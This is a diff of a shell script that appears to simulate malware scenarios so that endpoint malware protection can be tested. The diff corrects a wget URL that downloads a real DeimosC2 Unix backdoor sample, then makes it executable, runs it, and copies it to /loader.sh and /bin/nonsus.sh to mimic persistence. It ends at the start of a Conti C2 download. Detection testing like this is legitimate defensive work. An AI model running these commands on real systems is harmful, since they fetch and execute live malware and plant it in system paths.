@@ -23,20 +23,20 @@ sleep 3
 echo "Senario 2 - Malware Protection"
 # Step 1 - Unix Backdoor Senario 
 echo "[+] Downloading Unixbackdoor Script "
-wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O unixbackdoor.sh
-chmod 700 unixbackdoor.sh
-sh unix
+wget https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+chmod 700 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
+sh 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 sleep 3
 
 # Senario 1.A Local Malware Persisitance 
 # Create Shadow Copies 
 echo "[+] Creating copies in suspicious pladces"
-cat unixbackdoor.sh > /loader.sh
+cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /loader.sh
 chmod 700 /loader.sh
 
 # Additional Shadow Cppies 
 echo "[+] Creating more shadow copies" 
-cat unixbackdoor.sh > /bin/nonsus.sh
+cat 05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 > /bin/nonsus.sh
 chmod 700 /bin/nonsus.sh 
 sleep 10 
 
@@ -44,7 +44,8 @@ sleep 10
 echo "[+] Making unixbackdoor executable"
 chmod 700 unixbackdoor.sh
 # execute 
-sh uunixbackdoor.sh
+echo "[+] Executing the Unix BackDoor"
+05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64
 
 # Step 2 - Conti
 echo "[+] Downloading Conti-C2 malware"
